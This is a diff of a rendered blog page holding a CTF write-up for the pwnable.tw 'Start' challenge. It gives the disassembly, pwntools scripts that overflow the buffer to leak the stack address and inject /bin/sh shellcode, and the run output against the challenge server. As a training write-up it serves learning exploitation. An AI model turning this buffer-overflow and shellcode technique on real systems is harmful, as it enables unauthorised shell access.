@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
 <meta name="description" content="This challenge is quite simple, it has no protection against the hacker. Just use buffer overflow to change the return address and you can leak stack address. You can then send your shellcode to get the flag.
- Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string 6Aa7." />
+Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string 6Aa7." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -26,7 +26,7 @@
 
 
 
-<link rel="stylesheet" href="/main.393856bf2c430bb6c01d7af07c6fe966e7cce8073435cfbbc46e590bab7405ef.css">
+<link rel="stylesheet" href="/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
 
 
 
@@ -35,33 +35,28 @@
 
 <meta itemprop="name" content="Start - Pwnable.tw">
 <meta itemprop="description" content="This challenge is quite simple, it has no protection against the hacker. Just use buffer overflow to change the return address and you can leak stack address. You can then send your shellcode to get the flag.
- Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string 6Aa7.">
-<meta itemprop="datePublished" content="2020-06-05T16:48:25+02:00" />
+Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string 6Aa7."><meta itemprop="datePublished" content="2020-06-05T16:48:25+02:00" />
 <meta itemprop="dateModified" content="2020-06-05T16:48:25+02:00" />
-<meta itemprop="wordCount" content="536">
-<meta itemprop="image" content="http://foxmaccloud.com/"/>
-
-
-
+<meta itemprop="wordCount" content="536"><meta itemprop="image" content="http://foxmaccloud.com/"/>
 <meta itemprop="keywords" content="" />
-
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="http://foxmaccloud.com/"/>
 
 <meta name="twitter:title" content="Start - Pwnable.tw"/>
 <meta name="twitter:description" content="This challenge is quite simple, it has no protection against the hacker. Just use buffer overflow to change the return address and you can leak stack address. You can then send your shellcode to get the flag.
- Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string 6Aa7."/>
+Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string 6Aa7."/>
+
 
 
 
     <meta property="og:title" content="Start - Pwnable.tw" />
 <meta property="og:description" content="This challenge is quite simple, it has no protection against the hacker. Just use buffer overflow to change the return address and you can leak stack address. You can then send your shellcode to get the flag.
- Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string 6Aa7." />
+Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string 6Aa7." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://foxmaccloud.com/writeups/pwnabletw/start/" />
-<meta property="og:image" content="http://foxmaccloud.com/"/>
+<meta property="og:url" content="http://foxmaccloud.com/writeups/pwnabletw/start/" /><meta property="og:image" content="http://foxmaccloud.com/"/><meta property="article:section" content="writeups" />
 <meta property="article:published_time" content="2020-06-05T16:48:25+02:00" />
 <meta property="article:modified_time" content="2020-06-05T16:48:25+02:00" /><meta property="og:site_name" content="FoxCorp" />
+
 
 
 
@@ -77,9 +72,14 @@
 
 
 
+
+
     </head>
 
-    <body class="dark-theme">
+    
+        <body>
+    
+    
         <div class="container">
             <header class="header">
     <span class="header__inner">
@@ -101,7 +101,7 @@
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="http://foxmaccloud.com/posts/">Posts</a></li><li><a href="http://foxmaccloud.com/whoami/">whoami</a></li><li><a href="http://foxmaccloud.com/writeups/">Writeups</a></li>
+    <ul class="menu__inner"><li><a href="/posts/">Posts</a></li><li><a href="/whoami/">whoami</a></li><li><a href="/writeups/">Writeups</a></li>
     </ul>
 </nav>
 
@@ -112,13 +112,6 @@
                     </svg>
                 </span>
             
-
-            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
-</svg>
-</span>
         </span>
     </span>
 </header>
@@ -137,7 +130,7 @@
             <h2 class="post-title"><a href="http://foxmaccloud.com/writeups/pwnabletw/start/">Start - Pwnable.tw</a></h2>
 
             
-
+            
             
 
             <div class="post-content">
@@ -151,115 +144,115 @@ Running the executable trough tools such as GDB Enhanced Features (GEF) and chec
 <hr>
 <h2 id="finding-the-stack-pointer">Finding the stack pointer</h2>
 <p>Disassembling the binary;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048060</span>  push esp
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048061</span>  push loc._exit
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048066</span>  xor eax, eax
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048068</span>  xor ebx, ebx
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804806a</span>  xor ecx, ecx
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804806c</span>  xor edx, edx
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804806e</span>  push <span style="color:#ae81ff">0x3a465443</span>             <span style="color:#75715e">; &#39;CTF:&#39;</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048073</span>  push <span style="color:#ae81ff">0x20656874</span>             <span style="color:#75715e">; &#39;the &#39;</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048078</span>  push <span style="color:#ae81ff">0x20747261</span>             <span style="color:#75715e">; &#39;art &#39;</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804807d</span>  push <span style="color:#ae81ff">0x74732073</span>             <span style="color:#75715e">; &#39;s st&#39;</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048082</span>  push <span style="color:#ae81ff">0x2774654c</span>             <span style="color:#75715e">; &#39;Let&#39;&#39;</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048087</span>  mov ecx, esp
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048089</span>  mov dl, <span style="color:#ae81ff">0x14</span>                <span style="color:#75715e">; 20</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804808b</span>  mov bl, <span style="color:#ae81ff">1</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804808d</span>  mov al, <span style="color:#ae81ff">4</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804808f</span>  int <span style="color:#ae81ff">0x80</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048091</span>  xor ebx, ebx
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048093</span>  mov dl, <span style="color:#ae81ff">0x3c</span>                <span style="color:#75715e">; &#39;&lt;&#39; ; 60</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048095</span>  mov al, <span style="color:#ae81ff">3</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048097</span>  int <span style="color:#ae81ff">0x80</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048099</span>  add esp, <span style="color:#ae81ff">0x14</span>
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804809c</span>  ret
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804809d</span>  pop esp
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804809e</span>  xor eax, eax
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080480a0</span>  inc eax
-<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080480a1</span>  int <span style="color:#ae81ff">0x80</span>
-</code></pre></div><p>We want to return to <code>0x08048087</code> right before the code sets up for sys_write.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048060</span>  push esp
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048061</span>  push loc._exit
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048066</span>  xor eax, eax
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048068</span>  xor ebx, ebx
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804806a</span>  xor ecx, ecx
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804806c</span>  xor edx, edx
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804806e</span>  push <span style="color:#ae81ff">0x3a465443</span>             <span style="color:#75715e">; &#39;CTF:&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048073</span>  push <span style="color:#ae81ff">0x20656874</span>             <span style="color:#75715e">; &#39;the &#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048078</span>  push <span style="color:#ae81ff">0x20747261</span>             <span style="color:#75715e">; &#39;art &#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804807d</span>  push <span style="color:#ae81ff">0x74732073</span>             <span style="color:#75715e">; &#39;s st&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048082</span>  push <span style="color:#ae81ff">0x2774654c</span>             <span style="color:#75715e">; &#39;Let&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048087</span>  mov ecx, esp
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048089</span>  mov dl, <span style="color:#ae81ff">0x14</span>                <span style="color:#75715e">; 20</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804808b</span>  mov bl, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804808d</span>  mov al, <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804808f</span>  int <span style="color:#ae81ff">0x80</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048091</span>  xor ebx, ebx
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048093</span>  mov dl, <span style="color:#ae81ff">0x3c</span>                <span style="color:#75715e">; &#39;&lt;&#39; ; 60</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048095</span>  mov al, <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048097</span>  int <span style="color:#ae81ff">0x80</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048099</span>  add esp, <span style="color:#ae81ff">0x14</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804809c</span>  ret
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804809d</span>  pop esp
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804809e</span>  xor eax, eax
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080480a0</span>  inc eax
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080480a1</span>  int <span style="color:#ae81ff">0x80</span>
+</span></span></code></pre></div><p>We want to return to <code>0x08048087</code> right before the code sets up for sys_write.
 This way we can leak the stack pointer.</p>
 <hr>
 <h2 id="start-making-our-payload">Start making our payload</h2>
 <p>Now that we know where to find the stack pointer, we start crafting our payload.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> os
-elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./start&#34;</span>)
-
-local <span style="color:#f92672">=</span> True
-
-<span style="color:#66d9ef">if</span> local <span style="color:#f92672">==</span> True:
-    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
-<span style="color:#66d9ef">else</span>:
-    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;chall.pwnable.tw&#34;</span>
-    port <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000</span>
-    p <span style="color:#f92672">=</span> remote(url, port)
-
-payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#75715e"># fill the buffer!</span>
-payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x08048087</span>) <span style="color:#75715e"># &#34;mov ecx, esp&#34;</span>
-
-<span style="color:#66d9ef">print</span>(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;CTF:&#34;</span>))
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Leaking stack address...&#34;</span>)
-p<span style="color:#f92672">.</span>send(payload)
-stackAddress <span style="color:#f92672">=</span> unpack(p<span style="color:#f92672">.</span>read()[:<span style="color:#ae81ff">4</span>])
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Leaked Address: &#34;</span> <span style="color:#f92672">+</span> hex(stackAddress))
-</code></pre></div><p>This will give us the stack pointer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./start&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> local <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;chall.pwnable.tw&#34;</span>
+</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000</span>
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(url, port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#75715e"># fill the buffer!</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x08048087</span>) <span style="color:#75715e"># &#34;mov ecx, esp&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;CTF:&#34;</span>))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Leaking stack address...&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>stackAddress <span style="color:#f92672">=</span> unpack(p<span style="color:#f92672">.</span>read()[:<span style="color:#ae81ff">4</span>])
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Leaked Address: &#34;</span> <span style="color:#f92672">+</span> hex(stackAddress))
+</span></span></code></pre></div><p>This will give us the stack pointer.</p>
 <hr>
 <h2 id="making-our-shellcode-and-getting-shell">Making our shellcode and getting shell</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> os
-elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./start&#34;</span>)
-
-local <span style="color:#f92672">=</span> False
-
-<span style="color:#66d9ef">if</span> local <span style="color:#f92672">==</span> True:
-    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
-<span style="color:#66d9ef">else</span>:
-    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;chall.pwnable.tw&#34;</span>
-    port <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000</span>
-    p <span style="color:#f92672">=</span> remote(url, port)
-
-payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#75715e"># fill the buffer!</span>
-payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x08048087</span>) <span style="color:#75715e"># &#34;mov ecx, esp&#34;</span>
-
-<span style="color:#66d9ef">print</span>(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;CTF:&#34;</span>))
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Leaking stack address...&#34;</span>)
-p<span style="color:#f92672">.</span>send(payload)
-stackAddress <span style="color:#f92672">=</span> unpack(p<span style="color:#f92672">.</span>read()[:<span style="color:#ae81ff">4</span>])
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Leaked Address: &#34;</span> <span style="color:#f92672">+</span> hex(stackAddress))
-
-shellcode <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
-shellcode <span style="color:#f92672">+=</span> p32(stackAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">20</span>)
-shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;xor eax, eax&#39;</span>)
-shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;add eax, 0xb&#39;</span>)
-shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;xor ecx, ecx&#39;</span>)
-shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;xor edx, edx&#39;</span>)
-shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;xor esi, esi&#39;</span>)
-shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;push 0x&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>hex())
-shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;push 0x&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/bin&#39;</span>[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>hex())
-shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;mov ebx, esp&#39;</span>)
-shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;int 0x80&#39;</span>)
-shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;push 0x0804809d&#39;</span>)
-shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;ret&#39;</span>)
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Generated shellcode: &#34;</span> <span style="color:#f92672">+</span> str(shellcode))
-
-p<span style="color:#f92672">.</span>send(shellcode)
-p<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p>After executing this code, I got access to the system and got my flag!</p>
-<pre><code>[*] '/home/foxmaccloud/Documents/CTF/Pwnable.tw/start/start'
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./start&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> local <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;chall.pwnable.tw&#34;</span>
+</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000</span>
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(url, port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#75715e"># fill the buffer!</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x08048087</span>) <span style="color:#75715e"># &#34;mov ecx, esp&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;CTF:&#34;</span>))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Leaking stack address...&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>stackAddress <span style="color:#f92672">=</span> unpack(p<span style="color:#f92672">.</span>read()[:<span style="color:#ae81ff">4</span>])
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Leaked Address: &#34;</span> <span style="color:#f92672">+</span> hex(stackAddress))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> p32(stackAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">20</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;xor eax, eax&#39;</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;add eax, 0xb&#39;</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;xor ecx, ecx&#39;</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;xor edx, edx&#39;</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;xor esi, esi&#39;</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;push 0x&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>hex())
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;push 0x&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/bin&#39;</span>[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>hex())
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;mov ebx, esp&#39;</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;int 0x80&#39;</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;push 0x0804809d&#39;</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;ret&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Generated shellcode: &#34;</span> <span style="color:#f92672">+</span> str(shellcode))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(shellcode)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>After executing this code, I got access to the system and got my flag!</p>
+<pre tabindex="0"><code>[*] &#39;/home/foxmaccloud/Documents/CTF/Pwnable.tw/start/start&#39;
     Arch:     i386-32-little
     RELRO:    No RELRO
     Stack:    No canary found
     NX:       NX disabled
     PIE:      No PIE (0x8048000)
 [+] Opening connection to chall.pwnable.tw on port 10000: Done
-b&quot;Let's start the CTF:&quot;
+b&#34;Let&#39;s start the CTF:&#34;
 
 [+] Leaking stack address...
 
 [+] Leaked Address: 0xffcfa730
 
